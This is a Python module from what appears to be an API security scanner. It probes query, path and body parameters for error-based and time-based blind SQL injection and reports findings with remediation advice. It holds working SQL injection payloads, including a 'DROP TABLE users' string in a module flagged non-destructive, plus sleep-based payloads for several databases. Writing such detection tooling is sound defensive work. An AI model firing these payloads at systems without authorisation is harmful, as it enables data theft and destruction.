"""
SQL Injection Detection Module
Tests error-based, boolean-based, and time-based blind SQLi per parameter.
"""
from __future__ import annotations
import json
import time
import httpx

from modules.base import BaseModule, Endpoint, ScanConfig
from engine.finding import Finding, Severity
from engine.session_manager import SessionContext

SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "1' AND 1=CONVERT(int, (SELECT @@version))--",
]

SQLI_BOOLEAN_PAYLOADS = [
    ("' OR 1=1--", "' OR 1=2--"),
]

SQLI_TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",   # MSSQL
    "'; SELECT SLEEP(5)--",          # MySQL
    "'; SELECT pg_sleep(5)--",       # PostgreSQL
    "1 AND SLEEP(5)",
]

DB_ERROR_MARKERS = [
    "sql syntax", "mysql_fetch", "ora-", "sqlstate",
    "unclosed quotation", "syntax error", "sqlite_",
    "pg::syntaxerror", "microsoft sql", "jdbc",
    "you have an error in your sql", "warning: mysql",
    "postgresql", "quoted string not properly terminated",
]


def _first_param(endpoint: Endpoint) -> str | None:
    for p in endpoint.parameters:
        if p.get("in") in ("query", "path"):
            return p.get("name")
    return None


class SqliModule(BaseModule):
    name = "sqli"
    title = "SQL Injection"
    owasp_category = "API10:2023"
    cwe_ids = ["CWE-89"]
    severity_default = Severity.CRITICAL
    safe_mode_compatible = True
    destructive = False

    async def run(
        self,
        endpoint: Endpoint,
        session: SessionContext,
        config: ScanConfig,
        client: httpx.AsyncClient,
    ) -> list[Finding]:
        findings: list[Finding] = []
        if not self.is_enabled(config):
            return findings

        # Test query parameters
        for param in endpoint.parameters:
            if param.get("in") not in ("query", "path"):
                continue
            param_name = param.get("name", "")
            result = await self._test_error_based(endpoint, session, config, client, param_name, "query")
            if result:
                findings.append(result)
                continue  # One finding per param is enough
            result = await self._test_time_based(endpoint, session, config, client, param_name, "query")
            if result:
                findings.append(result)

        # Test request body fields for POST/PUT/PATCH
        if endpoint.method.upper() in ("POST", "PUT", "PATCH") and endpoint.request_body_schema:
            props = endpoint.request_body_schema.get("properties", {})
            for field_name in list(props.keys())[:5]:  # Limit to first 5 fields
                result = await self._test_error_based(endpoint, session, config, client, field_name, "body")
                if result:
                    findings.append(result)
                    break

        return findings

    async def _test_error_based(
        self, endpoint: Endpoint, session: SessionContext,
        config: ScanConfig, client: httpx.AsyncClient,
        param_name: str, location: str,
    ) -> Finding | None:
        for payload in SQLI_ERROR_PAYLOADS:
            req_kwargs = session.apply({"headers": {}})
            if location == "query":
                req_kwargs["params"] = {param_name: payload}
            else:
                req_kwargs["content"] = json.dumps({param_name: payload}).encode()
                req_kwargs.setdefault("headers", {})["Content-Type"] = "application/json"

            try:
                resp = await client.request(
                    endpoint.method, endpoint.full_url,
                    timeout=config.timeout, **req_kwargs
                )
                body_lower = resp.text.lower()
                for marker in DB_ERROR_MARKERS:
                    if marker in body_lower:
                        return self._build_finding(
                            title=f"SQL Injection (Error-Based) — Parameter `{param_name}`",
                            severity=Severity.CRITICAL,
                            cvss_score=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            description=(
                                f"SQL injection was detected via the `{param_name}` parameter. "
                                f"The payload `{payload}` triggered a database error message in the response."
                            ),
                            business_impact=(
                                "SQL injection allows attackers to read/modify/delete database contents, "
                                "bypass authentication, and potentially execute OS commands."
                            ),
                            remediation=(
                                "Use parameterized queries or prepared statements exclusively. "
                                "Never concatenate user input into SQL strings. "
                                "Apply a WAF as a defense-in-depth measure. "
                                "Suppress database errors in production responses."
                            ),
                            endpoint_method=endpoint.method,
                            endpoint_path=endpoint.path,
                            evidence_request=f"{endpoint.method} {endpoint.full_url}\n{param_name}={payload}",
                            evidence_response=f"HTTP {resp.status_code}\n{resp.text[:500]}",
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://cwe.mitre.org/data/definitions/89.html",
                            ],
                        )
            except Exception:
                continue
        return None

    async def _test_time_based(
        self, endpoint: Endpoint, session: SessionContext,
        config: ScanConfig, client: httpx.AsyncClient,
        param_name: str, location: str,
    ) -> Finding | None:
        for payload in SQLI_TIME_PAYLOADS:
            req_kwargs = session.apply({"headers": {}})
            if location == "query":
                req_kwargs["params"] = {param_name: payload}
            else:
                req_kwargs["content"] = json.dumps({param_name: payload}).encode()
                req_kwargs.setdefault("headers", {})["Content-Type"] = "application/json"

            try:
                start = time.monotonic()
                resp = await client.request(
                    endpoint.method, endpoint.full_url,
                    timeout=max(config.timeout, 15), **req_kwargs
                )
                elapsed = time.monotonic() - start
                if elapsed >= 4.5:  # 5s sleep injected, threshold 4.5s
                    return self._build_finding(
                        title=f"SQL Injection (Time-Based Blind) — Parameter `{param_name}`",
                        severity=Severity.CRITICAL,
                        cvss_score=9.8,
                        description=(
                            f"Time-based blind SQL injection detected via `{param_name}`. "
                            f"Payload `{payload}` caused a {elapsed:.1f}s response delay."
                        ),
                        business_impact="Blind SQLi enables data exfiltration char-by-char even without error output.",
                        remediation="Use parameterized queries. Apply strict input validation.",
                        endpoint_method=endpoint.method,
                        endpoint_path=endpoint.path,
                        evidence_request=f"{endpoint.method} {endpoint.full_url}\n{param_name}={payload}",
                        evidence_response=f"HTTP {resp.status_code} (response time: {elapsed:.1f}s)",
                        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                    )
            except Exception:
                continue
        return None
